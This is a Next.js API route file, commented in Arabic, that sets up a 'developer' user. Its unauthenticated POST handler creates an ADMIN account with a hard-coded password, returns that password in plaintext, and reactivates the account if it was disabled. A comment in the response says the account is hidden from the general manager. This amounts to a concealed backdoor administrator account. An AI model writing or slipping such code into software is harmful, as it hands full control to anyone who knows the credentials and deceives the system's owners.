import { NextRequest, NextResponse } from 'next/server'
import { db } from '@/lib/db'
import bcrypt from 'bcryptjs'

/**
 * API endpoint لإنشاء حساب المطور
 * يمكن استدعاؤه مرة واحدة فقط
 */
export async function POST(request: NextRequest) {
  try {
    // التحقق من وجود حساب مطور
    const existingDeveloper = await db.user.findFirst({
      where: {
        email: 'developer@system.local'
      }
    })

    if (existingDeveloper) {
      // تفعيل الحساب إذا كان موجود
      await db.user.update({
        where: { id: existingDeveloper.id },
        data: { isActive: true }
      })

      return NextResponse.json({
        success: true,
        message: 'حساب المطور موجود بالفعل وتم تفعيله',
        developer: {
          email: existingDeveloper.email,
          isActive: true
        }
      })
    }

    // إنشاء حساب المطور (مؤقتاً كـ ADMIN حتى يتم تشغيل migration)
    const hashedPassword = await bcrypt.hash('Dev@2025!Secure', 12)
    
    const developer = await db.user.create({
      data: {
        name: 'System Developer',
        email: 'developer@system.local',
        password: hashedPassword,
        role: 'ADMIN', // سيتم تغييره إلى DEVELOPER بعد migration
        isActive: true
      },
      select: {
        id: true,
        email: true,
        name: true,
        role: true,
        isActive: true
      }
    })

    return NextResponse.json({
      success: true,
      message: 'تم إنشاء حساب المطور بنجاح',
      developer: {
        email: developer.email,
        password: 'Dev@2025!Secure',
        isActive: developer.isActive
      },
      note: 'هذا الحساب مخفي تماماً ولا يظهر للمدير العام'
    })

  } catch (error) {
    console.error('Error creating developer:', error)
    return NextResponse.json(
      { 
        success: false,
        error: 'فشل في إنشاء حساب المطور',
        details: error instanceof Error ? error.message : 'خطأ غير معروف'
      },
      { status: 500 }
    )
  }
}

// GET endpoint للتحقق من حالة المطور
export async function GET() {
  try {
    const developer = await db.user.findFirst({
      where: {
        email: 'developer@system.local'
      },
      select: {
        email: true,
        isActive: true,
        createdAt: true
      }
    })

    if (!developer) {
      return NextResponse.json({
        exists: false,
        message: 'لا يوجد حساب مطور'
      })
    }

    return NextResponse.json({
      exists: true,
      developer: {
        email: developer.email,
        isActive: developer.isActive,
        createdAt: developer.createdAt
      }
    })

  } catch (error) {
    return NextResponse.json(
      { error: 'خطأ في التحقق من حساب المطور' },
      { status: 500 }
    )
  }
}
